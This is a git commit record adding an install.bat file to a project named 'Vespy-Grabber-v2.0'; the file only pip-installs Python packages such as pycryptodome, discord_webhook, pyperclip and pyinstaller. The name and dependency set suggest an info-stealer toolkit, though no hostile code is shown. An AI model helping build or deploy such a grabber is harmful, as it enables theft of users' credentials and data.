b10d34d60d8ce3f339656b7c615a5a8861454753
vespyloll <132025258+vespyloll@users.noreply.github.com>
2023-04-27 17:29:40 -0700

    Add files via upload

---
+++ Vespy-Grabber-v2.0-main/install.bat
@@ -0,0 +1,11 @@
+pip install requests
+pip install winshell
+pip install psutil
+pip install pypiwin32
+pip install pycryptodome
+pip install cryptography
+pip install pillow
+pip install discord_webhook
+pip install pyperclip
+pip install pyinstaller
+pip install chardet
